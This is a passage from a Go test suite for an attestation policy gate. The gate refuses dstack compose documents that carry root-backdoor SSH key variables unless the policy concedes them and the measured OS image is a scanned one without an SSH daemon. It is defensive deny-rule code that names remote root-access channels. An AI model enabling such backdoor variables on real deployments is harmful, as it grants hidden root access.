			// A refusal must not ALSO publish the carve-out. A caller
			// that reads the slice without gating on the error would
			// otherwise advertise a concession on a document that was
			// refused for exactly that concession's subject.
			if len(ex) != 0 {
				t.Fatalf("refused and still reported a concession: %v", ex)
			}
		})
	}
}

// TestRootBackdoorExemption_HonouredOnAScannedImage is the positive half. Without
// it the test above is satisfied by a gate that refuses unconditionally, which
// would refuse every ACI upstream while looking correct.
func TestRootBackdoorExemption_HonouredOnAScannedImage(t *testing.T) {
	doc := backdoorDoc()
	p := ComposePolicy{
		AllowedRootBackdoorEnvs:  []string{"DSTACK_ROOT_PUBLIC_KEY"},
		RootBackdoorSafeOSImages: OSImagesWithoutSSHDaemon(),
	}
	_, ex, err := VerifyUpstreamAppCompose(doc, sealedOn(doc, safeImage()), p)
	if err != nil {
		t.Fatalf("a concession on a scanned image was refused: %v", err)
	}
	if len(ex) != 1 || ex[0].Subject != "DSTACK_ROOT_PUBLIC_KEY" {
		t.Fatalf("the concession was not reported: %v", ex)
	}
}

// TestACIUpstreamPolicy_ShipsTheSafeImageSet. The constructor has to supply it,
// or every caller that passes a concession gets a refusal it cannot explain —
// and the obvious fix for that confusing refusal is to widen the concession,
// which is the wrong direction.
func TestACIUpstreamPolicy_ShipsTheSafeImageSet(t *testing.T) {
	got := ACIUpstreamComposePolicy([]string{"DSTACK_ROOT_PUBLIC_KEY"}).RootBackdoorSafeOSImages
	if len(got) == 0 {
		t.Fatal("ACIUpstreamComposePolicy names no safe image, so it can never honour " +
			"the concession its own signature accepts")
	}
	if !slices.Equal(got, OSImagesWithoutSSHDaemon()) {
		t.Errorf("safe images = %v, want %v", got, OSImagesWithoutSSHDaemon())
	}
}

// TestOSImagesWithoutSSHDaemon_IsASubsetOfTrusted.
//
// Honouring a root-backdoor concession on an image we would not otherwise trust
// makes no sense: the appraisal refuses on os-image-hash first, so such an entry
// could only ever mislead a reader into thinking the pair had been considered.
// The inclusion is one-directional on purpose — trusted does NOT imply scanned,
// which is the distinction the two lists exist to keep.
func TestOSImagesWithoutSSHDaemon_IsASubsetOfTrusted(t *testing.T) {
	trusted := TrustedDstackOSImages()
	for _, img := range OSImagesWithoutSSHDaemon() {
		if !containsFold(trusted, img) {
			t.Errorf("%s is named safe for a root-backdoor concession but is not a "+
				"trusted OS image", img)
		}
	}
	if len(OSImagesWithoutSSHDaemon()) > len(trusted) {
		t.Error("more scanned images than trusted ones, which cannot be right")
	}
}

// TestOSImagesWithoutSSHDaemon_FreshSlicePerCall, for the reason
// TrustedDstackOSImages documents: these land in policy structs that callers
// mutate, and ACIUpstreamComposePolicy puts this one there by default.
func TestOSImagesWithoutSSHDaemon_FreshSlicePerCall(t *testing.T) {
	a := OSImagesWithoutSSHDaemon()
	if len(a) == 0 {
		t.Skip("empty list; nothing to alias")
	}
	a[0] = "mutated"
	if OSImagesWithoutSSHDaemon()[0] == "mutated" {
		t.Fatal("callers share a backing array, so one embedder's edit is visible to the next")
	}
}

// composeWithEnvs builds a policy-clean document that differs from the
// others only in allowed_envs, so a failure is attributable to the env rule
// and to nothing else.
func composeWithEnvs(t *testing.T, envs []string) string {
	t.Helper()
	return mustMarshal(t, map[string]any{
		"manifest_version":           2,
		"runner":                     "docker-compose",
		"docker_compose_file":        "services:\n  zs-node:\n    image: x@sha256:00\n",
		"allowed_envs":               envs,
		"local_key_provider_enabled": false,
	})
}

// TestRootBackdoorWithheld_TheMessageNamesTheImage pins the operator-facing
// half of the image gate, which is the half that decides what they do next.
//
// WHY THIS IS WORTH A TEST AND NOT JUST A STRING. The refusal for "you
// conceded this, but the image is unscanned" and the refusal for "you conceded
// nothing" are the same violation code on the same name. An operator who has
// already set allow_root_backdoor_env reads the undifferentiated message as
// the concession not working and widens it — away from the actual cause. The
// message is the only thing that distinguishes the two, so it is the assertion.
func TestRootBackdoorWithheld_TheMessageNamesTheImage(t *testing.T) {
	doc := backdoorDoc()
	unscanned := "806a352e16175d90568de97dff563f31f680239e6b90e9b5b2e9141d0955b0d9"

	for _, tc := range []struct {
		name, osImage, wantImage string
	}{
		{"an unscanned but trusted image", unscanned, unscanned},
		{"no os-image-hash in the replay", "", "(absent)"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			p := ComposePolicy{
				AllowedRootBackdoorEnvs:  []string{"DSTACK_ROOT_PUBLIC_KEY"},
				RootBackdoorSafeOSImages: OSImagesWithoutSSHDaemon(),
			}
			m := sealed(doc)
			if tc.osImage != "" {
				m[EventOSImageHash] = tc.osImage
			}

			_, ex, err := VerifyUpstreamAppCompose(doc, m, p)
			var pe *ComposePolicyError
			if !errors.As(err, &pe) {
				t.Fatalf("an unscanned image must still refuse: %v", err)
			}
			if len(ex) != 0 {
				t.Fatalf("a withheld concession must publish no exemption: %v", ex)
			}
			var detail string
			for _, v := range pe.Violations {
				if v.Code == ViolationRootBackdoorEnv {
					detail = v.Detail
				}
			}
			if !strings.Contains(detail, "withheld") {
				t.Errorf("message does not say the concession was withheld: %q", detail)
			}
			if !strings.Contains(detail, tc.wantImage) {
				t.Errorf("message does not name the image %q: %q", tc.wantImage, detail)
			}
		})
	}
}

// TestRootBackdoorWithheld_OnlyForTheNameActuallyConceded. A document naming a
// DIFFERENT backdoor channel than the policy conceded was never exempted, so
// the sharper message would be a false statement about that name — it would
// tell an operator their concession covered something it did not.
func TestRootBackdoorWithheld_OnlyForTheNameActuallyConceded(t *testing.T) {
	doc := backdoorDoc() // names DSTACK_ROOT_PUBLIC_KEY
	p := ComposePolicy{
		AllowedRootBackdoorEnvs:  []string{"DSTACK_AUTHORIZED_KEYS"},
		RootBackdoorSafeOSImages: OSImagesWithoutSSHDaemon(),
	}

	_, _, err := VerifyUpstreamAppCompose(doc, sealedOn(doc, "deadbeef"), p)
	var pe *ComposePolicyError
	if !errors.As(err, &pe) {
		t.Fatalf("want refusal, got %v", err)
	}
	for _, v := range pe.Violations {
		if v.Code == ViolationRootBackdoorEnv && strings.Contains(v.Detail, "withheld") {
			t.Fatalf("claimed a concession covered a name it never named: %q", v.Detail)
		}
	}
}

// TestRootBackdoorExemption_ImageComparisonNormalizesBothSides. The gate runs
// the measured value through normalizeHex; nothing else asserts that, and the
// producer normalizing today is what makes it survivable. Dropping the call
// leaves every other test green because the direction is fail-closed — a
// refusal, not a carve-out — which is exactly the kind of silent strictness
// that gets "fixed" later by removing the wrong line.
func TestRootBackdoorExemption_ImageComparisonNormalizesBothSides(t *testing.T) {
	doc := backdoorDoc()
	for _, spelling := range []string{
		"  0X" + strings.ToUpper(safeImage()) + "  ",
		"0x" + safeImage(),
		strings.ToUpper(safeImage()),
	} {
		p := ComposePolicy{
			AllowedRootBackdoorEnvs:  []string{"DSTACK_ROOT_PUBLIC_KEY"},
			RootBackdoorSafeOSImages: []string{" 0X" + strings.ToUpper(safeImage())},
		}
		_, ex, err := VerifyUpstreamAppCompose(doc, sealedOn(doc, spelling), p)
		if err != nil {
			t.Fatalf("%q: a non-canonical spelling of a safe image refused: %v", spelling, err)
		}
		if len(ex) != 1 {
			t.Fatalf("%q: want the concession honoured, got %v", spelling, ex)
		}
	}
}

// TestRootBackdoorExemption_DoesNotMutateTheCallersPolicy. The gate clears the
// concession on verifyAppCompose's by-value copy. node holds one Policy for
// the process lifetime and re-appraises every refresh_interval, so a pointer
// receiver anywhere on that path would let a single appraisal of an unscanned
// image strip the concession for every later one — a fail-closed direction,
// and therefore one that would show up as an unexplained refusal hours later
// rather than as a test failure.
func TestRootBackdoorExemption_DoesNotMutateTheCallersPolicy(t *testing.T) {
	doc := backdoorDoc()
	p := ComposePolicy{
		AllowedRootBackdoorEnvs:  []string{"DSTACK_ROOT_PUBLIC_KEY"},
		RootBackdoorSafeOSImages: OSImagesWithoutSSHDaemon(),
	}

	if _, _, err := VerifyUpstreamAppCompose(doc, sealedOn(doc, "deadbeef"), p); err == nil {
		t.Fatal("an unknown image must refuse")
	}
	if len(p.AllowedRootBackdoorEnvs) != 1 {
		t.Fatalf("the refused appraisal emptied the caller's concession: %v", p.AllowedRootBackdoorEnvs)
	}
	if p.rootBackdoorWithheld != nil || p.rootBackdoorWithheldOn != "" {
		t.Fatalf("the gate wrote its bookkeeping through to the caller")
	}

	_, ex, err := VerifyUpstreamAppCompose(doc, sealedOn(doc, safeImage()), p)
	if err != nil || len(ex) != 1 {
		t.Fatalf("a later appraisal on a safe image lost the concession: ex=%v err=%v", ex, err)
	}
}
